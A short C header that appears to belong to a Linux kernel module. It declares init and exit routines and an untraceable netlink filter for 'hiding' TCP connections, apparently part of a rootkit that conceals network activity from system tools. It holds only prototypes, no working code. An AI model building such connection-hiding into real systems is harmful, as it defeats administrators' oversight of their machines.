#ifndef BAT_HIDING_TCP_H
#define BAT_HIDING_TCP_H

int  hiding_tcp_init(void);
void hiding_tcp_exit(void);
notrace long tcp_hiding_filter_netlink(int protocol, unsigned char *buf, long len);

#endif /* BAT_HIDING_TCP_H */
